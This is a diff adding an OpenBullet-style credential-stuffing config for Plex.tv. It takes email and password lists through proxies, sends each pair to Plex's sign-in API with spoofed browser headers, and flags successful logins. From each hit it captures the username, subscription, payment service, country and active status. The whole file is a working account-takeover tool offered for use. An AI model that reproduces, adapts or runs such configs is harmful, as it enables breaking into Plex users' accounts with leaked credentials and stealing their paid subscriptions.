@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "PlexTv",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-09T17:51:19.6488441+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Im3eyyeD",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": true,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var token = uuidv4();
+END SCRIPT -> VARS "token"
+
+FUNCTION URLEncode "<token>" -> VAR "token" 
+
+#Login REQUEST POST "https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20SSO&X-Plex-Client-Identifier=<token>" 
+  CONTENT "login=<USER>&password=<PASS>&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: plex.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "Accept: application/json" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://app.plex.tv" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://app.plex.tv/" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8,fr;q=0.7,ru;q=0.6" 
+  HEADER "Content-Length: 60" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "User could not be authenticated" 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "authToken" 
+    KEY "<RESPONSECODE>" Contains "201" 
+
+#Username PARSE "<SOURCE>" JSON "username" -> CAP "Username" 
+
+#Subscribtion PARSE "<SOURCE>" JSON "subscriptionDescription" -> CAP "Subscription" 
+
+#Subscribet_At PARSE "<SOURCE>" JSON "subscribedAt" -> CAP "Subscribed since" 
+
+#Payment PARSE "<SOURCE>" JSON "paymentService" -> VAR "Payment" 
+
+#Country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "Country" 
+
+#Active PARSE "<SOURCE>" JSON "status" -> CAP "Status" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "<Status>" Contains "Active" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Status>" Contains "Inactive" 
+
